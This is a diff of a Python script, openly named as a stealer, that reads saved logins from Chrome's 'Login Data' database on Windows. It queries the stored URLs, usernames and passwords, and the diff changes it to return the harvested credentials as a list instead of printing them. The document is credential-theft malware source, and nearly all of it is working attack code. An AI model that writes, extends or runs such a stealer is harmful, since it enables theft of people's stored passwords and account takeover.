@@ -7,11 +7,12 @@ if platform.system() == "Windows":
 def steal():
 	# Do only if on Windows, Linux and Mac support will be added later
 	if platform.system() == "Windows":
-		steal_windows()
+		return steal_windows()
 	else:
-		print("[-] Only Windows is supported")
+		return ("[-] Only Windows is supported")
 
 def steal_windows():
+	ret = list()
 	# Chrome keeps passwords in the %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
 	path = os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data'
 	try:
@@ -20,14 +21,12 @@ def steal_windows():
 		cursor = conn.cursor()
 	# Whoah an error, happens when the database is locked (Chrome is still open)
 	except:
-		print('[-] Couldn\'t open the database')
-		return
+		return ('[-] Couldn\'t open the database')
 	# Execute the query
 	try:
 		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
 	except:
-		print('[-] Error getting the passwords')
-		return
+		return ('[-] Error getting the passwords')
 	# Fetch all data
 	data = cursor.fetchall()
 	# Check if there is any data
@@ -46,8 +45,7 @@ def steal_windows():
 				if(len(result[0]) <= 0):
 					result[0] = "(Unknown)"
 					# Print the result
-					print ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
-					return
+					ret.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
+		return ret
 	else:
-		print('[-] There are no passwords')
-		return
+		return ('[-] There are no passwords')
